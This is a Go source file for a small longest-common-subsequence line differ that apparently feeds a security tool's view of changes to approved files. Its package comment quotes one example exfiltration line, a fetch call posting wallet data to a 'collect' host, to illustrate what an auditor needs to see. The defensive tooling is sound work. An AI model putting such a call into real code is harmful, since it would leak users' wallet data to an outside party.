// Package textdiff is a small, dependency-free line differ. It backs the
// dashboard's rug-pull "proof" view (H1b): once eyebrow holds the approved bytes
// of a file (via the snapshot store) and the current bytes on disk, this turns
// the pair into the literal added/removed lines — the
// `+ fetch("https://collect…", {body: walletData})` an auditor wants to see,
// not just "this file changed."
//
// It is part of the pure domain core: no IO. The algorithm is a classic
// longest-common-subsequence line diff — correct and bounded, the bar a
// security tool needs (a hand-rolled subset that mis-renders a diff would be
// exactly the kind of latent bug we avoid). Callers skip binary blobs with
// Binary before diffing.
package textdiff

import "strings"

// Op classifies a line in the diff. The string values double as the gutter
// marker in a unified-diff rendering.
type Op string

const (
	Equal  Op = " " // present in both, unchanged
	Insert Op = "+" // added in the new version
	Delete Op = "-" // removed from the old version
)

// Line is one line of the diff with its 1-based position in each side (0 where
// the line does not exist on that side).
type Line struct {
	Op      Op     `json:"op"`
	Text    string `json:"text"`
	OldLine int    `json:"oldLine,omitempty"`
	NewLine int    `json:"newLine,omitempty"`
}

// Stat counts the changed lines, for an at-a-glance "+12 −3" summary.
type Stat struct {
	Added   int `json:"added"`
	Removed int `json:"removed"`
}

// Hunk is a contiguous changed region plus surrounding context, with the
// 1-based start line and line count on each side (the `@@ -a,b +c,d @@` header
// of a unified diff). Hunking keeps a large file's view to just what moved.
type Hunk struct {
	OldStart int    `json:"oldStart"`
	OldCount int    `json:"oldCount"`
	NewStart int    `json:"newStart"`
	NewCount int    `json:"newCount"`
	Lines    []Line `json:"lines"`
}

// Binary reports whether s looks like binary content (contains a NUL byte), so
// callers can skip it rather than render garbage as a diff.
func Binary(s string) bool { return strings.IndexByte(s, 0) >= 0 }

// Lines computes the full line-level diff of old → new via longest common
// subsequence. Equal lines are kept as context; the result reads top-to-bottom
// like a file with +/− markers.
func Lines(old, new string) []Line {
	a, b := splitLines(old), splitLines(new)
	m, n := len(a), len(b)

	// dp[i][j] = length of the LCS of a[i:] and b[j:].
	dp := make([][]int, m+1)
	for i := range dp {
		dp[i] = make([]int, n+1)
	}
	for i := m - 1; i >= 0; i-- {
		for j := n - 1; j >= 0; j-- {
			if a[i] == b[j] {
				dp[i][j] = dp[i+1][j+1] + 1
			} else {
				dp[i][j] = max(dp[i+1][j], dp[i][j+1])
			}
		}
	}

	var out []Line
	i, j, oldNo, newNo := 0, 0, 1, 1
	for i < m && j < n {
		switch {
		case a[i] == b[j]:
			out = append(out, Line{Op: Equal, Text: a[i], OldLine: oldNo, NewLine: newNo})
			i, j, oldNo, newNo = i+1, j+1, oldNo+1, newNo+1
		case dp[i+1][j] >= dp[i][j+1]:
			out = append(out, Line{Op: Delete, Text: a[i], OldLine: oldNo})
			i, oldNo = i+1, oldNo+1
		default:
			out = append(out, Line{Op: Insert, Text: b[j], NewLine: newNo})
			j, newNo = j+1, newNo+1
		}
	}
	for ; i < m; i, oldNo = i+1, oldNo+1 {
		out = append(out, Line{Op: Delete, Text: a[i], OldLine: oldNo})
	}
	for ; j < n; j, newNo = j+1, newNo+1 {
		out = append(out, Line{Op: Insert, Text: b[j], NewLine: newNo})
	}
	return out
}

// Count tallies the inserted and deleted lines in a diff.
func Count(lines []Line) Stat {
	var s Stat
	for _, l := range lines {
		switch l.Op {
		case Insert:
			s.Added++
		case Delete:
			s.Removed++
		}
	}
	return s
}

// Hunks groups a diff into changed regions, each padded with up to context
// equal lines on either side; adjacent regions whose context overlaps are
// merged. A diff with no changes yields no hunks.
func Hunks(lines []Line, context int) []Hunk {
	if context < 0 {
		context = 0
	}
	// Mark which lines are changed, and find the inclusive index window that
	// includes context around every changed line, merging overlaps.
	type span struct{ lo, hi int }
	var spans []span
	for idx, l := range lines {
		if l.Op == Equal {
			continue
		}
		lo, hi := idx-context, idx+context
		if lo < 0 {
			lo = 0
		}
		if hi > len(lines)-1 {
			hi = len(lines) - 1
		}
		if n := len(spans); n > 0 && lo <= spans[n-1].hi+1 {
			if hi > spans[n-1].hi {
				spans[n-1].hi = hi
			}
			continue
		}
		spans = append(spans, span{lo, hi})
	}

	hunks := make([]Hunk, 0, len(spans))
	for _, sp := range spans {
		seg := lines[sp.lo : sp.hi+1]
		h := Hunk{Lines: seg}
		for _, l := range seg {
			if l.OldLine != 0 {
				if h.OldStart == 0 {
					h.OldStart = l.OldLine
				}
				h.OldCount++
			}
			if l.NewLine != 0 {
				if h.NewStart == 0 {
					h.NewStart = l.NewLine
				}
				h.NewCount++
			}
		}
		hunks = append(hunks, h)
	}
	return hunks
}

// splitLines splits text into lines, dropping the single trailing empty element
// a final newline produces, so "a\nb" and "a\nb\n" diff identically.
func splitLines(s string) []string {
	if s == "" {
		return nil
	}
	lines := strings.Split(s, "\n")
	if k := len(lines); k > 0 && lines[k-1] == "" {
		lines = lines[:k-1]
	}
	return lines
}
